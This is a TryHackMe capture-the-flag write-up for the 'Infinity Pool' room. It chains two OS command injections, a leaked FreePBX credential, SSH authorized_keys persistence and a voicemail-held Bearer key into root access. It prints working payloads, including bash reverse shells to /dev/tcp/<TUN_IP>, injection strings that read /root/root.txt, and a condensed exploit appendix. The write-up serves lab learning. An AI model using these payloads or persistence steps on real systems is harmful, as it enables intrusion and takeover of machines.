# TryHackMe — Infinity Pool

> **Byte Lotus universe · Flask/gunicorn + FreePBX · web boot2root**
> **Result:** User `THM{n0_v1s****_3dg3}` · Root `THM{tr4c3d_****_h0r1z0n}`
> **Class:** two chained OS Command Injections, bridged by a credential leak and telephony data.
>
> *Flags and live credentials in this writeup are partially redacted on purpose — solve it yourself, don't copy-paste.*

---

## 0. Summary (TL;DR)

The room models not a single machine but **three service domains on one host**, reachable only over loopback. Each domain hands you the key to the next:

```
edge (public web)  →  telephony (FreePBX UCP)  →  automation (root)
```

Full exploitation chain:

```
[1] edge:80  OS Command Injection in /internal/netcheck (shell=True)   → RCE as web (uid 1001), USER FLAG
[2] :3000    /api/config leaks FreePBX UCP credentials                 → FreePBXUCPTemplateCreator:St4y****_2026
[3]          SSH pubkey persistence + local forward -L 8080            → stable access to UCP
[4] :8080    log in to FreePBX UCP → voicemail                         → automation Bearer key in Caller-ID
[5] :9000    OS Command Injection in /jobs/export (tar, as root)       → RCE as root, ROOT FLAG
```

The room's real lesson is **infrastructure thinking**. No single step is a standalone "box exploit" — it's reconnaissance of the relationships between services, where the data of one opens the next.

---

## 1. Recon

### 1.1. Port scan

```bash
nmap -sCV -O -p- 10.145.190.77
```

```
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp open  http    gunicorn
|  http-robots.txt: /internal/ /status
|_ http-title: Byte Lotus — Stay Noticed
Not shown: 65533 filtered tcp ports
```

**Analysis:**
- Only `22` and `80` are exposed. The other **65533 ports are `filtered`**, not `closed`. This is the key detail: a firewall silently drops packets → services almost certainly live behind it, reachable only from inside. Note it for the privesc phase.
- `Server: gunicorn` — a WSGI server, typically fronting Flask. The default 404 page later confirms Werkzeug (Flask's foundation).

### 1.2. Web enumeration

`robots.txt` and `app.js` are sources that hand you the location of the hidden functionality:

```bash
curl -s http://inpool.thm/robots.txt
# Disallow: /internal/
# Disallow: /status

curl -s http://inpool.thm/static/app.js
# TODO(ops): the staff connectivity tool at /status posts to the legacy
# /internal/netcheck handler.
```

**Analysis.** `robots.txt` is not protection — it's a **map of what the owner wants hidden** (WSTG-CONF-04: enumerate infrastructure/admin interfaces). The `Disallow` entries point straight at `/internal/` and `/status`. The `app.js` comment completes the picture: `/status` holds a form that POSTs to `/internal/netcheck`.

```bash
curl -s http://inpool.thm/status
# <form method="post" action="/internal/netcheck">
#   <input type="text" name="host" placeholder="property host e.g. 10.0.0.5">
```

The "Sister-property connectivity" tool is a form with a `host` field, POSTing to `/internal/netcheck`. Per the screenshot, submitting `127.0.0.1` returns the **raw stdout of `ping`**. That is the entry point.

---

## 2. Foothold — OS Command Injection on edge

**WSTG-INPV-12 (Testing for Command Injection) · CWE-78**

### 2.1. Theory before the exploit

The app returns the verbatim stdout of the system utility `ping`. So the backend spawns an external process somewhere. In Python there are several ways to do this, and whether injection exists at all depends on the implementation:

| Implementation | Does `;id` fire? |
|---|---|
| `os.system("ping -c1 " + host)` | ✅ |
| `subprocess.run("ping -c1 "+host, shell=True)` | ✅ |
| `subprocess.run(["ping","-c1", host])` (argv list, no shell) | ❌ metacharacters pass as one argument |

So before sending a probe this is a **hypothesis**, not a fact. It is proven by exactly one request.

### 2.2. Confirmation (differential probe)

```
POST /internal/netcheck
host=127.0.0.1;id
```

```
uid=1001(web) gid=1001(web) groups=1001(web)
ping: host=127.0.0.1: Name or service not known
```

**Reading the two lines:**
- `; id` executed → `uid=1001(web)`. The server built `ping -c1 <input>` and handed the whole string to a shell.
- `ping: ... Name or service not known` — ping tried to resolve the literal string. The `;` was split cleanly by the shell.

The `shell=True` + concatenation hypothesis is confirmed. The source (read later on the box) is verbatim:

```python
proc = subprocess.run(
    f"ping -c 1 {host}",
    shell=True, capture_output=True, text=True, timeout=15,
)
```

### 2.3. Reverse shell + user flag

```bash
# listener
nc -lvnp 4444
```
```
host=127.0.0.1;bash -c 'bash -i >& /dev/tcp/<TUN_IP>/4444 0>&1'
```

Stabilise:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl-Z ; stty raw -echo; fg ; export TERM=xterm
```

```bash
cat /home/web/user.txt
# THM{n0_v1s****_3dg3}
```

The "no visible edge" flag thematically confirms we are on the **edge node** (`/var/www/infinity_pool/edge/`), the "edge" of the network.

---

## 3. Internal recon — the three systems are loopback services

```bash
ip route          # single NIC ens5, only 10.145.128.0/18 — NO second subnet
ss -tnlp          # ← this is where the "three systems" live
```

```
127.0.0.1:3306   MySQL
127.0.0.1:5038   Asterisk AMI
127.0.0.1:8088   Splunk HEC
127.0.0.1:8089   Splunk mgmt
127.0.0.1:3000   gunicorn/Flask (internal API)
127.0.0.1:8080   Apache → FreePBX UCP
127.0.0.1:9000   gunicorn/Flask (automation)
0.0.0.0:80 / :22 public
```

**Analysis.** The "three systems nobody told you about" from the briefing are not separate hosts behind a second NIC (as in Voyage/Matryoshka) — they are **loopback services**, hidden from the outside by that `filtered` firewall. The three domains are confirmed by the directory layout:

```
/var/www/infinity_pool/
  edge/        (root:root, web reads)       ← taken
  watchtower/  (svc-watch:svc-watch, 0750)  ← monitoring (Splunk)
  automation/  (root:root, 0750)            ← automation (runs as root)
```

### 3.1. Port fingerprinting — the important detail about 404

```bash
curl -s -I http://127.0.0.1:3000/   # gunicorn, 200 on /
curl -s -I http://127.0.0.1:8080/   # Apache/2.4.58, static
curl -s -I http://127.0.0.1:9000/   # gunicorn, 404 on /
```

The `404` on `9000` is the **response of a live Flask app with no `/` route**, not "port closed". Default Werkzeug 404 (207 bytes). The functionality is hidden behind specific paths — the same way edge hid `/internal/netcheck`. Fuzzing confirmed:

```bash
curl -s http://127.0.0.1:9000/health
```
```json
{"service":"automation","runs_as":"root",
 "endpoints":{"POST /jobs/export":{
   "auth":"Authorization: Bearer <automation key>",
   "body":{"report":"<report name>"},
   "desc":"archive the latest data export"}}}
```

**Recon jackpot:** automation `runs_as: root`, the endpoint archives a report (→ likely `tar`, → likely injectable in the name), but requires a **Bearer key** we don't have. The task reduces to: *obtain the key → inject `report` → RCE as root*.

---

## 4. Credential leak — /api/config

The key should live with automation's "clients". The internal API on `:3000` turned out to be talkative:

```bash
# fuzz under the /api/ prefix (note: the service uses a Blueprint with url_prefix="/api")
curl -s http://127.0.0.1:3000/api/config
```
```json
{"automation_endpoint":"http://127.0.0.1:9000",
 "ops_note":"UCP still on default template creds (FreePBXUCPTemplateCreator) -- ROTATE.",
 "telephony_user":"FreePBXUCPTemplateCreator",
 "telephony_pass":"St4y****_2026",
 "telephony_portal":"http://127.0.0.1:8080/ucp"}
```

**WSTG-ATHN-02 / CWE-798 (Use of Hard-coded Credentials).** `/api/config` leaked not the automation Bearer key (as one might expect) but the **default FreePBX UCP credentials**. The `ops_note` is a verbatim nod to **CVE-2026-46376** (unrotated hard-coded UCP template credentials).

> **Methodology lesson #1.** `/api/*` must be fuzzed under its own prefix. A first loop without `/api/` returned nothing but `404` (no top-level routes) and it was easy to write the service off as empty. A Blueprint with `url_prefix` is a standard Flask pattern.

---

## 5. Pivot into telephony — stable UCP access

UCP listens only on loopback → we need a tunnel. SSH for `web` is **key-only** (`PasswordAuthentication no`), but `web` owns its home directory, so it can append to its own `authorized_keys`.

### 5.1. SSH pubkey persistence (MITRE T1098.004)

```bash
# locally:
ssh-keygen -t ed25519 -f ~/.ssh/inpool_key -N ''
cat ~/.ssh/inpool_key.pub          # ← the .pub line is what goes into authorized_keys

# on the box (via RCE as web):
echo 'ssh-ed25519 AAAA... root@attacker' > ~/.ssh/authorized_keys
chmod 700 ~/.ssh; chmod 600 ~/.ssh/authorized_keys
```

> **Methodology lesson #2.** `authorized_keys` takes the **public** key (`ssh-ed25519 AAAA...`) — not the private-key body (`-----BEGIN OPENSSH PRIVATE KEY-----`) and not the fingerprint (`SHA256:...`). All three are different representations, and only `.pub` works. Trust in SSH is decentralised: the server lets in anyone whose public key sits in `authorized_keys` and who proves ownership of the private half — it does not check "whose" key it is.

### 5.2. Local port forward

```bash
ssh -i ~/.ssh/inpool_key -L 8080:127.0.0.1:8080 web@inpool.thm
```

With `-L` the browser needs no SOCKS: `http://127.0.0.1:8080/ucp/` goes straight through the tunnel. (Alternative — `-D 1080` SOCKS to reach every loopback port at once.)

> **Methodology lesson #3.** `000` in `curl` output = **transport did not complete** (dead tunnel/proxy), not an app 404. When you see a wall of `000`, fix the network, not the app. Also: `Address already in use` on `-D 1080` = a stale tunnel is holding the port → `pkill -f 'ssh.*inpool'` before the new one.

### 5.3. UCP login

Browser: `http://127.0.0.1:8080/ucp/` → `FreePBXUCPTemplateCreator : St4y****_2026` → **login succeeds** (FreePBX 16.0.45).

> **Methodology lesson #4.** A two-request `curl` login stalled on CSRF-token/session desync (`200` + a login form in the body). This is a **pjax SPA**: the form markup is present in the DOM even on an authenticated page. A failure through one tool (curl) is *not* proof the credentials are invalid — verify in a browser, where token+cookie live in one session. Don't harden a dual-readable output into a "fact".

---

## 6. The key in voicemail

Inside UCP the dashboard is empty → add the **Voicemail** widget. INBOX has one message:

```
CID:  "Automation Key cc_auto_7b3f****d2f6a" <9000>
Date: Tue, Jun 30 2026 · Duration: 3 s
```

**Analysis.** The key is hidden not in the audio but in the **Caller-ID field** of the voicemail message. `<9000>` = the caller's extension = the automation service port. This is the missing **Bearer key**: `cc_auto_7b3f****d2f6a`. Thematically — "the guestbook takes instructions" from the intro comic.

> Version note: FreePBX 16.0.45 is **patched** against the UCP-module RCE (Superfecta PHP-include, fixed in 16.0.39/17.0.7). So the authors did not intend a module exploit — the UCP goal was **data**, not RCE. That prunes a false branch in advance.

---

## 7. Privesc — OS Command Injection on automation (as root)

**WSTG-INPV-12 · CWE-78 (again, now privileged)**

### 7.1. Baseline call — read the command structure

The service kindly returns the `command` field — a gift for tuning the injection:

```bash
KEY="cc_auto_7b3f****d2f6a"   # from the voicemail Caller-ID
curl -s -X POST http://127.0.0.1:9000/jobs/export \
  -H "Authorization: Bearer $KEY" -H 'Content-Type: application/json' \
  -d '{"report":"latest; cat /root/root.txt"}'
```
```json
{"command":"tar czf /var/automation/exports/latest; cat /root/root.txt.tgz /var/automation/data 2>&1",
 "output":"cat: /root/root.txt.tgz: No such file or directory\n..."}
```

### 7.2. The subtlety: injection into the MIDDLE of a command

The backend builds:
```
tar czf /var/automation/exports/<report>.tgz /var/automation/data 2>&1
```
Your `report` is inserted **between `exports/` and `.tgz`** → the `.tgz` suffix sticks to the **end** of your input.

**Attempt #1 (fails):** `report=latest; cat /root/root.txt`
```
... ; cat /root/root.txt.tgz ...    ← .tgz glued to the path → file does not exist
```

**Attempt #2 (works):** `report=test; cat /root/root.txt;` — **trailing `;`**
```
tar ... /exports/test ; cat /root/root.txt ; .tgz /var/automation/data
                        └─ clean cat ─┘      └─ junk ─┘
```
```json
{"output":"THM{tr4c3d_****_h0r1z0n}\n/bin/sh: 1: .tgz: not found\n..."}
```

The trailing `;` split `cat /root/root.txt` away from the sticky `.tgz`, pushing the suffix into a separate (junk) third command.

> **Methodology lesson #5 (the key technical one).** When injecting into the **middle** of a command, always account for the text that comes **after** your insertion point. Consume the tail:
> - `;` — send the tail into a separate command
> - `#` — comment out the whole tail (cleanest): `{"report":"x; cat /root/root.txt #"}`
> - `%0a` — newline (the Silent Monitor pattern)

### 7.3. Root flag

```
ROOT FLAG: THM{tr4c3d_****_h0r1z0n}
```

For a stable root shell:
```
{"report":"x; bash -c 'bash -i >& /dev/tcp/<TUN_IP>/4445 0>&1' #"}
```

---

## 8. Vulnerability map

| # | Class | WSTG / CWE / CVE | Location | Result |
|---|---|---|---|---|
| 1 | OS Command Injection (in-band) | WSTG-INPV-12 / CWE-78 | `edge:80 /internal/netcheck` | RCE as `web` |
| 2 | Hard-coded / default creds | WSTG-ATHN-02 / CWE-798 / CVE-2026-46376 | `:3000 /api/config` | UCP creds leaked |
| 3 | Sensitive data in metadata | CWE-200 | UCP Voicemail Caller-ID | automation Bearer key |
| 4 | OS Command Injection (mid-command) | WSTG-INPV-12 / CWE-78 | `:9000 /jobs/export` | RCE as `root` |
| — | Persistence | MITRE T1098.004 | `~web/.ssh/authorized_keys` | stable SSH |

**Two distinct command-injection classes in one room:**
- **edge** — in-band, input at the end of the command, `;id` trivially works.
- **automation** — mid-command, the `.tgz` suffix after the insertion point requires neutralising the tail. The subtler case.

---

## 9. Red herrings

The room is generous with decoys that pull you away from the real path:

- **watchtower / Splunk (8088/8089)** — "monitoring", looks like a fat privesc vector (Splunk often runs as root). Dead end.
- **Asterisk AMI (5038)** — `Action: System` = RCE with valid creds. But the AMI secret is unreadable and `admin`/defaults don't work.
- **Password reuse of `St4y****_2026`** — tested against `su svc-watch`, `su ubuntu`, AMI, MySQL: **rejected everywhere**. The password is strictly UCP-context, not a master credential.
- **UCP-module RCE** — the version is patched, so it's not the intended path.

The real path ran through **data** the entire time (config leak → voicemail), not service exploits. Lesson: don't fixate on the most "powerful"-looking vector — test what the narrative points at (here, the comic pointing at voicemail).

---

## 10. Final lessons

1. **Infrastructure > box.** The "three systems" are linked services where each hands you the key to the next. Look at the relationships, not isolated hosts.
2. **`filtered` ≠ `closed`.** 65533 filtered ports from outside = services living on loopback. `ss -tnlp` after foothold is mandatory.
3. **Read `404`/`000` precisely.** A `404` from gunicorn = a live app with no `/` route. `000` from curl = dead transport. Don't confuse either with "empty".
4. **One tool doesn't render a verdict.** A failed curl login ≠ invalid credentials — verify in a browser. Don't harden a dual-readable output into a fact (prove a hypothesis, don't postulate it).
5. **Mid-command injection.** Account for the tail after your insertion point; neutralise with `;`/`#`/`%0a`.
6. **`authorized_keys` takes the `.pub` line.** Not the private key, not the fingerprint.
7. **An intermediate step ≠ the root vector.** The SSH tunnel obtained not root but *access to the next hint*. In boot2root most steps are collecting keys for the next link.

---

## Appendix — fast run (once understood)

```bash
# 1. foothold
curl -s -X POST http://inpool.thm/internal/netcheck \
  --data-urlencode 'host=127.0.0.1;bash -c "bash -i >& /dev/tcp/TUN/4444 0>&1"'

# 2. credentials (from the box)
curl -s http://127.0.0.1:3000/api/config

# 3. persistence + tunnel
echo 'ssh-ed25519 AAAA... ' > ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys
ssh -i ~/.ssh/inpool_key -L 8080:127.0.0.1:8080 web@inpool.thm

# 4. UCP → add Voicemail widget → Caller-ID holds the automation Bearer key

# 5. root (redact the real key before sharing)
curl -s -X POST http://127.0.0.1:9000/jobs/export \
  -H "Authorization: Bearer cc_auto_7b3f****d2f6a" \
  -H 'Content-Type: application/json' \
  -d '{"report":"x; cat /root/root.txt #"}'
```

**User:** `THM{n0_v1s****_3dg3}` · **Root:** `THM{tr4c3d_****_h0r1z0n}`

*(Flags and credentials redacted — full values are in your own session.)*
